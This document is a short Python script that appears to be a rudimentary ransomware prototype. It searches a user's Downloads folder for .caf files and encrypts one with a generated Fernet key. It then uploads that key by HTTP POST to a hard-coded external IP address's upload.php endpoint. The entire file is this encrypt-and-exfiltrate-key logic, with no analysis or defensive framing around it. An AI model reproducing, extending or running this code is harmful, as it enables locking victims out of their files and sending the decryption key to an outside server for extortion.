import os

# Define the file extension to search for
file_extension = ".caf"

# Define the root directory to start the search
root_directory = "/home/pouria/Downloads/"

# Specify the path of the file to encrypt
file_path = 'FILE_NOT_FOUND'

# Loop through all the directories in the root directory and its subdirectories
for root, dirs, files in os.walk(root_directory):
    # Loop through all the files in the current directory
    for file in files:
        # Check if the file has the desired file extension
        if file.endswith(file_extension):
            # Print the path to the file
            print(os.path.join(root, file))
            file_path = os.path.join(root, file)

if file_path == "FILE_NOT_FOUND":
    print("File not found!")
    exit()
    
import requests
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()

# Initialize the Fernet class with the key
fernet = Fernet(key)

# Read the contents of the file
with open(file_path, 'rb') as file:
    file_contents = file.read()

# Encrypt the file contents
encrypted_contents = fernet.encrypt(file_contents)

# Write the encrypted contents to a new file
encrypted_file_path = './encrypted_file'
with open(encrypted_file_path, 'wb') as encrypted_file:
    encrypted_file.write(encrypted_contents)

# Save the key to a file
key_file_path = './key'
with open(key_file_path, 'wb') as key_file:
    key_file.write(key)

# Read the key from the key file
with open(key_file_path, 'rb') as key_file:
    key = key_file.read()

# Send the key to the server via POST request
url = 'http://188.40.23.247/upload.php'
files = {'fileToUpload': open(key_file_path, 'rb')}
response = requests.post(url, files=files)

# Check the server response
if response.status_code == 200:
    print('Key uploaded successfully')
else:
    print('Failed to upload key')
